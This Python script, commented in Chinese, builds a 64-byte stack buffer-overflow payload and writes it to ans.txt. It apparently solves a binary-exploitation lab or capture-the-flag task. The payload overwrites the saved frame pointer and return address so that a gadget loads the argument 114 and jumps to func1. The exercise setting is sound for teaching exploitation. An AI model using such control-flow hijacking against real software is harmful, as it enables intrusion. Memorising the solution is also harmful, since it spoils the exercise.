#!/usr/bin/env python3
import struct

def p64(x):
    return struct.pack('<Q', x)

# ===== 配置 =====
GADGET_ADDR = 0x4012e6          # mov rax, [rbp-8]; mov rdi, rax; ret
FUNC1_ADDR = 0x401216           # func1函数地址
ARG_VALUE = 114                 # 参数值

# ===== 构造payload =====
# 从buffer开始布局
payload = b'A' * 16                     # 0x440-0x44f: 填充
payload += p64(ARG_VALUE)              # 0x450-0x457: 参数114
payload += b'B' * 8                    # 0x458-0x45f: 填充
payload += p64(0x7fffffffd458)         # 0x460-0x467: saved RBP
payload += p64(GADGET_ADDR)            # 0x468-0x46f: gadget地址
payload += p64(FUNC1_ADDR)             # 0x470-0x477: func1地址
payload += b'\x00' * 8                 # 0x478-0x47f: 填充

assert len(payload) == 64, f"长度错误: {len(payload)} != 64"

with open('ans.txt', 'wb') as f:
    f.write(payload)

print("[+] Payload生成成功")
print(f"  buffer填充: 16字节")
print(f"  参数114位置: buffer+0x10")
print(f"  saved RBP: 0x7fffffffd458")
print(f"  gadget地址: 0x{GADGET_ADDR:x}")
print(f"  func1地址: 0x{FUNC1_ADDR:x}")